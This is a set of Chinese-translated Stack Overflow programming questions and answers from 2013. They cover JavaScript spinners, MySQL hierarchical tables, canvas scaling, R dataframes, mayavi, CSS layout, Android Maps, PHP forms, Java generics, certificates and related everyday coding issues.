            zPanel.loader.init();
        });
    },

    loader: {

        init: function() {
            //Bind zloader to button click
            $('#button').click(function() {
                zPanel.loader.showLoader();
            });

            $('#hidebutton').click(function() {
                zPanel.loader.hideLoader();
            });
        },

        showLoader: function() {
            //Show Spinning Loader
            $('#zloader_overlay').fadeIn('fast', function() {
                $("#zloader").show();
                zPanel.loader.buildSpinner();
            });
        },

        hideLoader: function() {
            //Hide  Spinning Loader
            $('#zloader_overlay').fadeIn('fast', function() {
                $("#zloader").hide();

                // This is the function that is not working yet
                //zPanel.loader.spinner('stop');
                zPanel.loader.buildSpinner.spinner.stop();
            });
        },

        buildSpinner: function() {

            var opts = {
              lines: 9, // The number of lines to draw
              length: 11, // The length of each line
              width: 13, // The line thickness
              radius: 40, // The radius of the inner circle
              corners: 0.4, // Corner roundness (0..1)
              rotate: 0, // The rotation offset
              color: '#000', // #rgb or #rrggbb
              speed: 1, // Rounds per second
              trail: 60, // Afterglow percentage
              shadow: false, // Whether to render a shadow
              hwaccel: false, // Whether to use hardware acceleration
              className: 'spinner', // The CSS class to assign to the spinner
              zIndex: 2e9, // The z-index (defaults to 2000000000)
              top: 200, // Top position relative to parent in px
              left: 'auto' // Left position relative to parent in px
            };

            var target = document.getElementById('zloader_content');
            var spinner = new Spinner(opts).spin(target);

            // I need to call spinner.stop() some how from my function above name hideLoader()

        },

    }

};

zPanel.init(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:50:36.143

让您的微调器成为您的 zPanel 的成员。

```
var zPanel = {

    spinner:null,

    init: function() {
        $(document).ready(function() {
            zPanel.loader.init();
        });
    },

    loader: {

        init: function() {
            //Bind zloader to button click
            $('#button').click(function() {
                zPanel.loader.showLoader();
            });

            $('#hidebutton').click(function() {
                zPanel.loader.hideLoader();
            });
        },

        showLoader: function() {
            //Show Spinning Loader
            $('#zloader_overlay').fadeIn('fast', function() {
                $("#zloader").show();
                zPanel.loader.buildSpinner();
            });
        },

        hideLoader: function() {
            //Hide  Spinning Loader
            $('#zloader_overlay').fadeIn('fast', function() {
                $("#zloader").hide();
                zPanel.spinner.stop();
            });
        },

        buildSpinner: function() {

            var opts = {
              lines: 9, // The number of lines to draw
              length: 11, // The length of each line
              width: 13, // The line thickness
              radius: 40, // The radius of the inner circle
              corners: 0.4, // Corner roundness (0..1)
              rotate: 0, // The rotation offset
              color: '#000', // #rgb or #rrggbb
              speed: 1, // Rounds per second
              trail: 60, // Afterglow percentage
              shadow: false, // Whether to render a shadow
              hwaccel: false, // Whether to use hardware acceleration
              className: 'spinner', // The CSS class to assign to the spinner
              zIndex: 2e9, // The z-index (defaults to 2000000000)
              top: 200, // Top position relative to parent in px
              left: 'auto' // Left position relative to parent in px
            };

            var target = document.getElementById('zloader_content');
            zPanel.spinner = new Spinner(opts).spin(target);

            // I need to call spinner.stop() some how from my function above name hideLoader()

        },

    }

};

zPanel.init(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:51:05.270

将微调器保存到附加到 zPanel 的变量中，然后使用该引用停止微调器，这个怎么样：

```
var zPanel = {

    init: function() {
        $(document).ready(function() {
            zPanel.loader.init();
        });
    },

    loader: {

        init: function() {
            //Bind zloader to button click
            $('#button').click(function() {
                zPanel.loader.showLoader();
            });

            $('#hidebutton').click(function() {
                zPanel.loader.hideLoader();
            });
        },

        showLoader: function() {
            //Show Spinning Loader
            $('#zloader_overlay').fadeIn('fast', function() {
                $("#zloader").show();
                //showDiv();
                zPanel.spinner = zPanel.loader.buildSpinner();
            });
        },

        hideLoader: function() {
            //Hide  Spinning Loader
            $('#zloader_overlay').fadeIn('fast', function() {
                $("#zloader").hide();
                //showDiv();
                //zPanel.loader.spinner('stop');
                zPanel.spinner.stop();
            });
        },

        buildSpinner: function() {

            var opts = {
              lines: 9, // The number of lines to draw
              length: 11, // The length of each line
              width: 13, // The line thickness
              radius: 40, // The radius of the inner circle
              corners: 0.4, // Corner roundness (0..1)
              rotate: 0, // The rotation offset
              color: '#000', // #rgb or #rrggbb
              speed: 1, // Rounds per second
              trail: 60, // Afterglow percentage
              shadow: false, // Whether to render a shadow
              hwaccel: false, // Whether to use hardware acceleration
              className: 'spinner', // The CSS class to assign to the spinner
              zIndex: 2e9, // The z-index (defaults to 2000000000)
              top: 200, // Top position relative to parent in px
              left: 'auto' // Left position relative to parent in px
            };
            //var target = document.getElementById('zloader');
            var target = document.getElementById('zloader_content');
            var spinner = new Spinner(opts).spin(target);

            return spinner;
        },

    }

};

zPanel.init(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T23:53:00.583

zPanel 是一个对象。zPanel 中的函数只使用它们自己的变量。为了能够调用 spinner 对象，只需在 zPanel 中创建一个 spinner 属性并让所有函数都使用此属性：

```
var zPanel = {

    spinner: null,  //Notice the property!

    init: function() {
        $(document).ready(function() {
            zPanel.loader.init();
        });
    },

    loader: {

        init: function() {
            //Bind zloader to button click
            $('#button').click(function() {
                zPanel.loader.showLoader();
            });

            $('#hidebutton').click(function() {
                zPanel.loader.hideLoader();
            });
        },

        showLoader: function() {
            //Show Spinning Loader
            $('#zloader_overlay').fadeIn('fast', function() {
                $("#zloader").show();
                //showDiv();
                zPanel.loader.buildSpinner();
            });
        },

        hideLoader: function() {
            var self = this; //Create a variable that is accesable within the fadeIn
            //Hide  Spinning Loader
            $('#zloader_overlay').fadeIn('fast', function() {
                $("#zloader").hide();
                //showDiv();
                //Below code has changed!!
                self.spinner('stop');
                zPanel.loader.buildSpinner.spinner.stop();
            });
        },

        buildSpinner: function() {

            var opts = {
              lines: 9, // The number of lines to draw
              length: 11, // The length of each line
              width: 13, // The line thickness
              radius: 40, // The radius of the inner circle
              corners: 0.4, // Corner roundness (0..1)
              rotate: 0, // The rotation offset
              color: '#000', // #rgb or #rrggbb
              speed: 1, // Rounds per second
              trail: 60, // Afterglow percentage
              shadow: false, // Whether to render a shadow
              hwaccel: false, // Whether to use hardware acceleration
              className: 'spinner', // The CSS class to assign to the spinner
              zIndex: 2e9, // The z-index (defaults to 2000000000)
              top: 200, // Top position relative to parent in px
              left: 'auto' // Left position relative to parent in px
            };
            //var target = document.getElementById('zloader');
            var target = document.getElementById('zloader_content');

            //Below line has changed!!!
            this.spinner = new Spinner(opts).spin(target);

            //if(spinStart == 'stop'){
            //    zPanel.loader.spinner.spinner.stop();
            //}

        },

    } 
```

# mysql - 组和子组多达 5 级数据库结构

> ID：15845333
> 
> 赞同：0
> 
> 时间：2013-04-05T23:43:40.750
> 
> 标签：mysql, structure, hierarchical-data

我想知道 mysql 中表的最佳结构是什么，该结构需要具有：

```
Parent (level 0)
  -region (inside regions are)(level 1)
     -countrys (inside countrys are)(level 2)
       -Districts (level 3) 
```

所以我需要将所有这些信息存储在同一张表中，有什么线索吗？如果你需要知道我在 cakephp 上构建这个应用程序。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T03:02:34.743

我冲动地为您的情况制作了一个 EER 图。
请告诉我它是否有效（如果您同意），我将等待您的反馈。

> ![ER图](https://i.stack.imgur.com/FAq5B.png)

```
SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0;
SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0;
SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='TRADITIONAL,ALLOW_INVALID_DATES';

DROP SCHEMA IF EXISTS `hierarchy` ;
CREATE SCHEMA IF NOT EXISTS `hierarchy` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci ;
USE `hierarchy` ;

-- -----------------------------------------------------
-- Table `hierarchy`.`level`
-- -----------------------------------------------------
CREATE  TABLE IF NOT EXISTS `hierarchy`.`level` (
  `id` TINYINT UNSIGNED NOT NULL AUTO_INCREMENT ,
  `name` VARCHAR(20) NOT NULL ,
  PRIMARY KEY (`id`) ,
  UNIQUE INDEX `name_UNIQUE` (`name` ASC) )
ENGINE = InnoDB;

-- -----------------------------------------------------
-- Table `hierarchy`.`location`
-- -----------------------------------------------------
CREATE  TABLE IF NOT EXISTS `hierarchy`.`location` (
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT ,
  `parent` INT UNSIGNED NULL ,
  `name` VARCHAR(50) NOT NULL ,
  `level` TINYINT UNSIGNED NULL ,
  PRIMARY KEY (`id`) ,
  INDEX `fk_location_location_idx` (`parent` ASC) ,
  INDEX `fk_location_level1_idx` (`level` ASC) ,
  INDEX `index_name` (`name` ASC) ,
  CONSTRAINT `fk_location_location`
    FOREIGN KEY (`parent` )
    REFERENCES `hierarchy`.`location` (`id` )
    ON DELETE NO ACTION
    ON UPDATE NO ACTION,
  CONSTRAINT `fk_location_level1`
    FOREIGN KEY (`level` )
    REFERENCES `hierarchy`.`level` (`id` )
    ON DELETE NO ACTION
    ON UPDATE NO ACTION)
ENGINE = InnoDB;

USE `hierarchy` ;

-- -----------------------------------------------------
-- Placeholder table for view `hierarchy`.`details_location`
-- -----------------------------------------------------
CREATE TABLE IF NOT EXISTS `hierarchy`.`details_location` (`location_id` INT, `location_name` INT, `parent_id` INT, `level_id` INT, `level_name` INT, `children` INT);

-- -----------------------------------------------------
-- View `hierarchy`.`details_location`
-- -----------------------------------------------------
DROP TABLE IF EXISTS `hierarchy`.`details_location`;
USE `hierarchy`;
CREATE  OR REPLACE VIEW `hierarchy`.`details_location` AS
SELECT
  x.`id` AS `location_id`,
  x.`name` AS `location_name`,
  IFNULL(x.`parent`, 0) AS `parent_id`,
  y.`id` AS `level_id`,
  y.`name` AS `level_name`,
  (SELECT COUNT(*) FROM location AS l WHERE l.parent = x.id) AS `children`
FROM location AS `x`
INNER JOIN `level` AS `y`
  ON (x.`level` = y.id);
USE `hierarchy`;

DELIMITER $$
USE `hierarchy`$$

CREATE TRIGGER `insert_location` BEFORE INSERT ON location
FOR EACH ROW BEGIN
  DECLARE x INT UNSIGNED DEFAULT 1;

  IF NEW.parent IS NOT NULL THEN
    SELECT `level`+1 INTO x FROM location WHERE id = NEW.parent;
  END IF;

  SET NEW.`level` = x;
END$$

DELIMITER ;

SET SQL_MODE=@OLD_SQL_MODE;
SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS;
SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS;

-- -----------------------------------------------------
-- Data for table `hierarchy`.`level`
-- -----------------------------------------------------
START TRANSACTION;
USE `hierarchy`;
INSERT INTO `hierarchy`.`level` (`id`, `name`) VALUES (1, 'parent');
INSERT INTO `hierarchy`.`level` (`id`, `name`) VALUES (2, 'region');
INSERT INTO `hierarchy`.`level` (`id`, `name`) VALUES (3, 'country');
INSERT INTO `hierarchy`.`level` (`id`, `name`) VALUES (4, 'district');

COMMIT;

INSERT INTO location (parent,name,level) VALUES
(NULL,'a1',NULL), (NULL,'a2',NULL), (NULL,'a3',NULL);

INSERT INTO location (parent,name,level) VALUES
(1,'b1',NULL), (1,'b2',NULL), (2,'b3',NULL),
(2,'b4',NULL), (3,'b5',NULL), (3,'b6',NULL);

INSERT INTO location (parent,name,level) VALUES
(4,'c1',NULL), (4,'c2',NULL), (5,'c3',NULL),
(5,'c4',NULL), (6,'c5',NULL), (6,'c6',NULL),
(7,'c7',NULL), (7,'c8',NULL), (8,'c9',NULL),
(8,'c10',NULL), (9,'c11',NULL), (9,'c12',NULL);

SELECT * FROM details_location; 
```

*[（大部分）来自 MySQL Workbench 5.2 的自动生成代码]*
请注意，触发器`insert_location`在注册时确定项目的级别，因此父级的级别增加一个单位。

# javascript - 缩放画布，以便 base64 toDataURL() 也被缩放

> ID：15845334
> 
> 赞同：2
> 
> 时间：2013-04-05T23:43:56.347
> 
> 标签：javascript, html, canvas

我正在构建一个 chrome 扩展来保存网页的屏幕截图。我已经将屏幕截图全部拼凑成一个 HTML5 画布元素。

如果我然后用 canvas.toDataURL('image/jpeg', 0.8); 显示图像 它工作正常。

但是，如果我尝试首先通过获取上下文并使用它来缩放图像：

```
var context = canvas.getContext('2d');
context.scale(.75,.75); 
```

然后输出`canvas.toDataURL('image/jpeg', 0.8);`与没有缩放的图像大小相同的图像。我错过了什么？如何缩放图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T08:34:58.290

如果你想得到一个按比例缩小`<canvas>`：

*   创建`<canvas>`您要捕获的第二宽度所需的宽度和高度

*   使用[https://developer.mozilla.org/en-US/docs/HTML/Canvas/Tutorial/Using_images#Scaling](https://developer.mozilla.org/en-US/docs/HTML/Canvas/Tutorial/Using_images#Scaling)绘制第 1`<canvas>`到第 2 （画布是有效来源）`<canvas>``drawImage()`

*   保存第二`<canvas>`

# r - 向现有数据框添加特殊列

> ID：15845336
> 
> 赞同：-1
> 
> 时间：2013-04-05T23:44:09.707
> 
> 标签：r, dataframe

我想在循环中将包含三个值的列添加到现有数据框中，每次都附加到现有行：

现有的数据框是 MktData 有很多这样的行：

```
 BidPrice AskPrice  Last Volume
XLU    39.14    39.15 39.15   9242 
```

新列由三个值组成，称为权重`100, 200, 300`

所以最终的数据框应该是

```
 BidPrice AskPrice  Last Volume      weights
XLU    39.14    39.15 39.15   9242 100,200,300 
```

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T00:02:43.063

您也可以使用`paste`.

```
df$weights<-paste0(c(100,200,300),collapse=",") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:55:27.630

做就是了：

```
df$weights <- list(c(100,200,300))
#     BidPrice AskPrice  Last Volume       weights
# XLU    39.14    39.15 39.15   9242 100, 200, 300 
```

但请注意，该`weights`列是一个`list`.

# python - mayavi - 以编程方式设置图像的 [x,y,z] 范围

> ID：15845338
> 
> 赞同：6
> 
> 时间：2013-04-05T23:44:24.553
> 
> 标签：python, image, 3d, transformation, mayavi

我有一些数据，其中包含几个 2D 图像，我想使用`mayavi2 (v4.3.0)`.

[从文档](http://docs.enthought.com/mayavi/mayavi/auto/mlab_helper_functions.html#mayavi.mlab.imshow)看来，我应该只能用`mlab.imshow()`. `imshow`不幸的是，当我调用指定`extent`参数 ( `AttributeError: 'ImageActor' object has no attribute 'actor'`)时，mayavi 会引发异常。

我还尝试通过修改直接设置 x、y 和 z 数据`im.mlab_source.x,y,z...`。奇怪的是，虽然这正确地改变了 x 和 y 范围，但它对 z 位置没有任何作用，即使发生了`im.mlab_source.z`明显的变化。

这是一个可运行的示例：

```
import numpy as np
from scipy.misc import lena
from mayavi import mlab

def normal_imshow(img=lena()):
    return mlab.imshow(img,colormap='gray') 

def set_extent(img=lena()):
    return mlab.imshow(img,extent=[0,100,0,100,50,50],colormap='cool')

def set_xyz(img=lena()):
    im = mlab.imshow(img,colormap='hot')    
    src = im.mlab_source
    print 'Old z :',src.z
    src.x = 100*(src.x - src.x.min())/(src.x.max() - src.x.min())
    src.y = 100*(src.y - src.y.min())/(src.x.max() - src.y.min())
    src.z[:] = 50
    print 'New z :',src.z
    return im

if __name__ == '__main__':

    # this works
    normal_imshow()

    # # this fails (AttributeError)
    # set_extent()

    # weirdly, this seems to work for the x and y axes, but does not change
    # the z-postion even though data.z does change
    set_xyz() 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-10T19:45:19.550

好的，事实证明这是 mayavi 中的一个[已知错误](https://github.com/enthought/mayavi/pull/45)。`ImageActor`但是，可以在创建对象后更改对象的方向、位置和比例：

```
obj = mlab.imshow(img)
obj.actor.orientation = [0, 0, 0]  # the required orientation 
obj.actor.position = [0, 0, 0]     # the required  position 
obj.actor.scale = [0, 0, 0]        # the required scale 
```

# css - 下 div 与上 div 重叠

> ID：15845343
> 
> 赞同：2
> 
> 时间：2013-04-05T23:44:49.403
> 
> 标签：css, html, css-float

一直在为此绞尽脑汁，但没有任何运气。我有一个由两列组成的页面。左列向左浮动，右列向右浮动。每列内有两个 div，它们是一个在另一个之上。在右栏中，他们似乎做得很好，上面有一个表单，下面有一个 div，但在左栏中，下 div 与上 div 的底部重叠了 15px 左右。

继承人 index.php：

```
 <!-- wraps entired contents of website below header -->
<div id="mainWrap"> 
    <div id="leftColumn">
        <!-- module for most recent posts -->
        <article id="recentPosts">
            <h1>Recent Submissions</h1>
            <section id="recentPostsContent">
                <p>upper right div content</p>
            </section>
        </article><!-- close recentPosts -->
        <!-- Pagination -->
        <div id="pagination">
            <p>lower left div content</p>
        </div>
        <!-- end pagination -->

    </div><!-- close left column -->

    <div id="rightColumn">
        <!-- Search bar -->
        <form id="searchForm" action="search.php" method="post">
            <input class="navSearchInput" type="text" name="searchInput" placeholder="search here.."/>
            <input class="navButtonSearch" type="submit" name="submitSearch" value="Search" /> 
        </form>
        <!--end search bar -->

        <!-- randomly generated image linking to a post -->
        <article id="randomPost">
            <h1>Hightlighted Post</h1>
            <section id="randomPostContent">
                <p>content</p>
            </section>
        </article><!-- close randomPost -->

    </div><!-- close right column -->
    <div style="clear:both;"></div><!-- clears floating columns -->
</div><!-- close mainWrap --> 
```

和相关的CSS：

```
#mainWrap{
margin:0 auto;
width:980px;
min-height:700px;
margin-top:20px;
}
#leftColumn{ border:1px solid green;width:700px;float:left;margin:0 0px 0 0;min-height:500px;}
    #recentPosts{width:700px;height:310px;}
    #recentPostsContent{
        width:700px;
        height:300px;
        border:1px solid #dfdfdf;
        border-radius:0 0 3px 3px;
        margin:0 0 20px 0;
    }
    #recentPosts h1{
        width:652px;
    }
    #pagination{
    width:700px;
    height:40px;
    border:1px solid #dfdfdf;
    border-radius:0 0 3px 3px;
    }

#rightColumn{border:1px solid green;width:254px;float:right;min-height:500px;}
    #randomPost h1{width:205px;}
    #randomPost{
    width:250px;
    height:310px;
    }

    #randomPostContent{
        width:253px;
        height:300px;
        border:1px solid #dfdfdf;
        border-radius:0 0 3px 3px;
    } 
```

为什么较低的 div 像这样重叠？

以下是相关网页的链接：www.chrissepham.com/sites/newmjbox/index.php

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:58:19.567

问题是您已明确将高度设置为`#recentPosts`to `310px`，这会导致高度被限制。如果您删除它，它应该会正常运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:56:12.460

真实`height`的`#recentPosts`不仅仅是你在 CSS 中设置的（310px）。这会导致奇怪的行为`#pagination`

# android - 如何以编程方式检测 Google Map 是否实际在 Android 上使用 API v2 加载（例如，当网络不可用时）？

> ID：15845351
> 
> 赞同：2
> 
> 时间：2013-04-05T23:46:05.513
> 
> 标签：android, google-maps-android-api-2, google-play-services

我使用 FragmentActivity 中的 SupportMapFragment 在 Android 上运行良好的 Google Map API v2。

但是，当没有网络连接（也没有缓存信息）时，显然无法显示地图。LogCat 给了我一条错误消息，确认了这一点（“Google Maps Android API：无法加载地图。无法连接到 Google 服务器”），但这并没有被抛出。

我如何以编程方式检测这种情况，因为在这种情况下我想转发到不同的活动？文档声称，如果无法加载地图，则在 SupportMapFragment 上调用 getMap() 将返回 null，但情况似乎并非如此。

我一直在寻找近两天的解决方案，但找不到任何东西。我是否完全忽略了某些东西，或者真的不可能找出是否实际加载了某些东西？任何帮助是极大的赞赏。

**编辑：**

这是我当前的代码，执行 setContentView 后（使用调试器检查），日志中出现错误消息，但它仍然显示 ConnectionResult == SUCESS。

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.activity_main);

    SupportMapFragment smf = ((SupportMapFragment) 
    getSupportFragmentManager().findFragmentById(R.id.map));
    map = smf.getMap();

    if (map != null && GooglePlayServicesUtil.isGooglePlayServicesAvailable(this) == 
                                        ConnectionResult.SUCCESS) {
        // doSomething with the map
    } else {
        Toast.makeText(this, "Google Maps not working", Toast.LENGTH_SHORT).show();
        System.out.println(GooglePlayServicesUtil.isGooglePlayServicesAvailable(this));
        // forward to another activity
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T09:10:42.010

GooglePlayServicesUtil.isGooglePlayServicesAvailable 与您设备上可用的 GooglePlayServices.APK 相关。API 不会为您提供任何有关何时加载图块的指示。

您可以选择：

1.  通过尝试检查是否缓存了任何切片（hackish，简化）：`new File(getExternalCacheDir(), "cache_vts_your.package.name.0").exists()`
2.  使用您自己的代码检查互联网可用性
3.  ~~解析 logcat 以查找错误~~

**编辑：**

注意点 3 已弃用，因为出于安全原因，应用程序不再允许读取日志

# html - CA 的 jvector 地图想要简单地将省份链接到每个 html 页面

> ID：15845360
> 
> 赞同：0
> 
> 时间：2013-04-05T23:46:59.550
> 
> 标签：html, hyperlink, jvectormap

我正在使用以下 CA 地图：

资产/jquery-jvectormap-ca-lcc-en.js

我没有对任何文件进行任何修改。

每当有人点击其中任何一个时，我想要的只是将所有省份链接到他们的 html 页面。

这是我正在使用的现场演示页面：http: [//mindsharehost.com/maps/tests/reverse-projection.html](http://mindsharehost.com/maps/tests/reverse-projection.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-17T21:48:36.217

如果我正确理解你的问题，你就差不多完成了。您需要做的就是使用 `location.href`.

```
$(function () {
    $('#map').vectorMap({
        map: 'ca_lcc_en',
        markers: markers,
        onMarkerClick: function (e, index) {
            location.href = markers[index].weburl;
        }
    });
}); 
```

# php - 表单电子邮件提交的 POST 方法问题

> ID：15845364
> 
> 赞同：0
> 
> 时间：2013-04-05T23:47:41.490
> 
> 标签：php, forms, email

我使用以下代码（在 HAML 中）创建了一个 html 表单：

```
%form#cForm{method: 'post', name:'contactForm', action: 'formEmail.php'}
  %input{type:'text', name: 'name'} Name / Business:
  %input{type: 'text', name:'email'} Your Email:
  %textarea{name: 'message'} Message:
  %input{type:'submit', value:'Send Form'} 
```

这是 php 文件（formEmail.php）：

```
<?php

header('Content-type: text/html; charset=utf-8');

if(!isset($_POST['submit']))
{
    //This page should not be accessed directly. Need to submit the form.
echo "error; you need to submit the form!";
}
$name = $_POST['name'];
$visitor_email = $_POST['email'];
$message = $_POST['message'];

//Validate first
if(empty($name)||empty($visitor_email)) 
{
    echo "Name and email are mandatory!";
    exit;
}

if(IsInjected($visitor_email))
{
    echo "Bad email value!";
    exit;
}

$email_from = 'david.w.martin@me.com';
$email_subject = "New Form submission";
$email_body = "You have received a new message from the user $name.\n".
    "Here is the message:\n $message".

$to = "david.w.martin@me.com";
$headers = "From: $email_from \r\n";
$headers .= "Reply-To: $visitor_email \r\n";
//Send the email!
mail($to,$email_subject,$email_body,$headers);
//done. redirect to thank-you page.
header('Location: thank-you.html');

// Function to validate against any email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
          );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}

?> 
```

当我单击“提交”时，我在控制台中收到以下错误：

```
POST http://localhost:9000/formEmail.php [HTTP/1.1 404 Not Found 0ms] 
```

并且浏览器中出现以下消息：

```
Cannot POST /formEmail.php 
```

但是，我可以直接访问该文件（通过将 url 输入浏览器）。

该表单位于模式弹出窗口内（包含在 Zurb Foundation 框架中）。

我迷路了，求救！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:06:58.420

尝试放入`http://localhost:9000/formEmail.php`属性`action`。也许端口被忽略了，它试图到达`http://localhost/formEmail.php`当然是 404。

# java - 为什么 <> 运算符不允许用于 1.7 以下的源？

> ID：15845372
> 
> 赞同：8
> 
> 时间：2013-04-05T23:49:34.943
> 
> 标签：java

在 java 程序中，我有以下代码行：

```
HashMap<String, String> query_args = new HashMap<>(); 
```

我收到以下错误：

'<>' 运算符不允许用于低于 1.7 的源级别

我试图将项目合规性和 jre 更改为 1.7，但随后 eclipse 无法解决导入问题。我正在使用 jre 1.6。

有什么建议么？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-05T23:51:26.287

在 Java 7（此处为 1.7）之前，您需要执行

```
HashMap<String, String> query_args = new HashMap<String, String>(); 
```

它被称为菱形运算符，并且与早期版本的 Java 不向后兼容。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-04-05T23:50:37.610

因为这直到 Java 7 才引入。除了记录 Java 的历史之外，我真的不知道如何回答这个问题。

关于导入，您应该研究为什么 Eclipse 在设置为 Java 1.7 时无法解析它们的任何导入，并且如果需要将其作为单独的问题发布。

# linux - 批量多重命名工具

> ID：15845375
> 
> 赞同：0
> 
> 时间：2013-04-05T23:50:03.443
> 
> 标签：linux, shell

我需要一个实时多重命名工具。你可以在双指挥官中找到，甚至更好的总指挥官。我能找到的最好的是 renameutils，它列出了所有文件并让我在我最喜欢的文本编辑器中编辑它们，但没有什么比专门用于重命名的东西更好的了。

有这样的程序吗？必须是实时的和交互式的——我必须在点击“OK”键之前查看我正在做的编辑。必须在命令行中 - ncurses、slang、shell。只是不是图形用户界面。

* * *

编辑：它可能不属于这里，但超级用户:) 仍然欢迎回答。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:11:30.597

重命名魔杖怎么样？[http://renamewand.sourceforge.net/](http://renamewand.sourceforge.net/)

但是您确实应该尝试使用超级用户：[https ://superuser.com/questions/25378/mass-renaming-nix-version](https://superuser.com/questions/25378/mass-renaming-nix-version)

# tomcat - Keytool 无法链接导入的 PCKS12 证书？

> ID：15845384
> 
> 赞同：0
> 
> 时间：2013-04-05T23:50:54.693
> 
> 标签：tomcat, ssl-certificate, osx-mountain-lion, keystore, keytool

我有山狮服务器和 Go Daddy 签署的 SSL 证书。我成功使用了证书的各种服务，该证书已使用多个在线 SSL 检查器工具进行了验证。

我最近设置了在 Tomcat 下运行的 Jira，因此我需要使用导入到密钥库中的相同证书。

我注意到根 Go Daddy 证书不在 /Library/Java/Home/lib/security/cacerts 中，因此我将它作为受信任的证书与中间证书一起导入。

为了让 tomcat 使用 HTTPS，我必须使用私钥导入我的证书。我能够使用 Keychain Access 实用程序将其导出为 .p12 文件来执行此操作。然后我可以使用私钥将证书导入密钥库。一切似乎都很顺利——除了 SSL 检查器工具报告了一个损坏的信任链。我使用 keytool 转储证书信息，它确实表明链中只有 1 个证书，而不是我预期的 3 个。

导入证书的方法似乎无法解决信任链问题。

我错过了什么？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-26T10:24:09.160

让密钥包含整个证书链，或者让密钥加上一个或多个证书在您的密钥库中是有区别的。

您可以使用 openssl 创建包含整个证书链的密钥，例如：

```
openssl pkcs12 -in <key in .pem-format> -export -out tmp-keystore.p12 -certfile <one file with several cert-blocks> 
```

# php - 如何在没有“？”的情况下将标签存储在 url 中

> ID：15845387
> 
> 赞同：0
> 
> 时间：2013-04-05T23:51:16.820
> 
> 标签：php

我想知道如何在没有 ? 并且没有钥匙。

例如。谷歌产品论坛这样做：[http://productforums.google.com/forum/](http://productforums.google.com/forum/) **#!topic/analytics/8qtK861a0iU** 每个主题都没有自己的目录，因此服务器端脚本决定向访问者显示哪个主题。

有谁知道如何用 PHP 做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:53:13.457

谷歌使用一系列软件来做到这一点。其中之一，可以使用 Apache 服务器（不是 IIS）上使用的 .htaccess 来完成

这称为modrewrite。下面的 URL 可以显示此类任务的示例：

[http://roshanbh.com.np/2008/03/url-rewriting-examples-htaccess.html](http://roshanbh.com.np/2008/03/url-rewriting-examples-htaccess.html)

开始学习这个，上传一个文件`.htaccess`到你的 Apache 驱动的网络服务器。

# javascript - if (!!variable) 和 if (variable) 之间的区别？

> ID：15845391
> 
> 赞同：3
> 
> 时间：2013-04-05T23:51:48.470
> 
> 标签：javascript

使用双重否定和根本不使用它之间有什么区别（在 JS 中）`!!`？

例如

`if (!!variable){...` 对比`if (variable){...`

我知道有时我使用第二种方法收到警告..

什么时候应该使用每个？每个人何时会在控制台中发出警告？（对于变量、对象、数组等）

谢谢！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T23:54:29.563

分配它是有区别的，但在条件语句中使用它却没有。使用的原因`!!`是因为第一个`!`会将你的变量转换为它的真实评估，然后`not`是它。所以“你好”变为真，然后被否定，变为假，第二个`!`将否定假，产生真。当试图从变量中获取 thruthy 值时，这可能是可取的。但是，在 if 语句中这样做并没有什么好处。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-05T23:55:13.380

在这种特殊情况下，没有区别。其实`!!variable`是浪费。

但是在更一般的情况下，它将变量转换为布尔值。就我个人而言，我只在调试时发现这很有用，并了解哪些值是真值和假值。

# java - 如何运行检票口示例？

> ID：15845392
> 
> 赞同：2
> 
> 时间：2013-04-05T23:52:22.340
> 
> 标签：java, dynamic, web, project, wicket

我是网络编的新手。和检票口，所以我去下面的网站运行示例源代码来玩应用程序。

[http://www.wicket-library.com/wicket-examples/index.html](http://www.wicket-library.com/wicket-examples/index.html)

只需创建一个“动态 Web 项目”并尝试将源代码复制到项目中。

所有示例的应用程序类都是那种类型，

```
 public class ...(ex.name).Application extends WicketExampleApplication 
```

在互联网上，我找到了一些带有 WebApplication 类的示例，并且我设法运行了这些示例，就像那样

```
 public class ...(ex.name).Application extends WebApplication 
```

所以我的问题是；

1-如何使用动态 Web 项目简单地运行这些示例？

2-之后将源代码复制到我的项目中，我如何使用 maven 在我的项目中调用库？

我搜索了很多问题，但找不到任何试图在项目中简单地运行这些示例的主题。

谢谢。

普通

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T15:13:17.180

1.  而不是做所有凌乱的工作，只需使用 tthis [http://wicket.apache.org/start/quickstart.html] 运行 mvn
2.  现在只需复制来源

